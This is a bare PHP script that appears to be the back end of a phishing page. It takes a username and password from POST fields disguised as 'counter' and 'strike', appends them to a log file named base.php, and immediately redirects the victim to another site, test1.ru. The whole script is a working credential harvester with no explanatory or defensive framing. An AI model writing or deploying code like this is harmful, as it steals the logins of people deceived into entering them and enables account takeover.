<?

$Login = $_POST['counter']; 

$Pass = $_POST['strike']; 

$log = fopen("base.php","a+"); 

fwrite($log,"\n $Login:$Pass \n"); 

fclose($log); 

echo "<html><head><META HTTP-EQUIV='Refresh' content ='0;  URL=http://test1.ru/base/php'></head></html>";
?> 